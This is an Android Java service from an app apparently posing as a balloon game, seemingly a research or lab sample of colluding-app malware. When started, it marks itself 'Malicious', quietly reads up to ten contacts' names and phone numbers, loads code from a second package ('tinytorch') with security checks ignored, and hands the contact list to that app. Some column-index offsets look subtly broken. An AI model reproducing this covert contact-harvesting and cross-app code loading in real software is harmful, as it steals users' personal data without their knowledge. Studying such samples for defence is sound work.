package com.sec.iitr.balloon_game;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import java.lang.reflect.Constructor;
import java.util.HashMap;

import static android.content.ContentValues.TAG;

public class BackgroundService extends Service {

    private boolean isRunning;
    private Context context;
    private Handler handler;
    HashMap<String,String> contcats_List = new HashMap<String,String>();
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        this.context = this;
        this.isRunning = false;

    }

    private Runnable myTask = new Runnable() {

        public void run() {
            try {

                new ForegroundCheckTask().execute();
                Log.e(TAG, "fromService");
                stopSelf();
            }
            catch (Exception ex)
            {
                Log.e(TAG, ex.toString());
            }
        }


    };

    @Override
    public void onDestroy() {
        this.isRunning = false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onStartCommand()","Malicious");

        if(!this.isRunning) {
            this.isRunning = true;
            //this.backgroundThread.start();
            handler = new Handler(Looper.getMainLooper());
            handler.post(myTask);
        }
        return START_STICKY;
    }
    class ForegroundCheckTask extends AsyncTask<String[], Void, String> {
        String[] result;
        @Override
        protected  String doInBackground(String[]... params) {

            getContact(result);
            return "";
        }

        private Boolean getContact(final String[] param) {
            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

            try {
                int i=0;
                while (phones.moveToNext()) {

                    String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)+1);
                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)+1);
                    contcats_List.put(name, phoneNumber);
                    i++;
                    if(i==10)
                    {
                        break;
                    }
//                    Toast.makeText(getApplicationContext(),name+" "+phoneNumber, Toast.LENGTH_LONG).show();

                }
                phones.close();
                try {
                    PackageManager packageManager = getPackageManager();
                    try {
                        packageManager.getPackageInfo("com.sec.iitr.tinytorch", PackageManager.GET_ACTIVITIES);
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                        // Handle the exception (log, show a message, etc.)
                    }



                    final Context remoteContext = getApplicationContext().createPackageContext("com.sec.iitr.tinytorch",
                            Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);

                    final ClassLoader loader = remoteContext.getClassLoader();
                    final Class cls = loader.loadClass("com.sec.iitr.tinytorch.BackgroundService");
                    final Class clsnotify = loader.loadClass("com.sec.iitr.tinytorch.NotificationActivity");

                    final Constructor constructor = cls.getConstructor();
                    final Constructor constructor1 = clsnotify.getConstructor();
                    Handler h = new Handler(Looper.getMainLooper());
                    h.post(new Runnable() {
                        public void run() {
                            try {
                                //ComponentName component = new ComponentName(getApplicationContext(), AlarmReceiverRun247.class);
                                //getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED , PackageManager.DONT_KILL_APP);
                                //Intent stop = new Intent(getApplicationContext(), BackgroundService.class);
                                //stopService(stop);

                                Intent intent1 = new Intent(remoteContext, clsnotify);
                                intent1.putExtra("CONTACT_LIST", contcats_List);
                                intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
                                remoteContext.startActivity(intent1);


                                Service obj = Service.class.cast(constructor.newInstance());

                                Intent intent = new
                                        Intent(remoteContext, obj.getClass());

                                //intent.putExtra("CONTACT_LIST", contcats_List);
                                //remoteContext.startService(intent);


                            } catch (Exception ex) {
                                ex.printStackTrace();
                            }
                        }
                    });
                }
                catch(Exception ex)
                {
                    Log.e("I DONT KNOW",ex.toString());
                    ex.printStackTrace();
                }

            }
            catch (Exception ex)
            {
                phones.close();
            }
            finally {
                phones.close();
            }
            stopSelf();

            return true;
        }
    }
}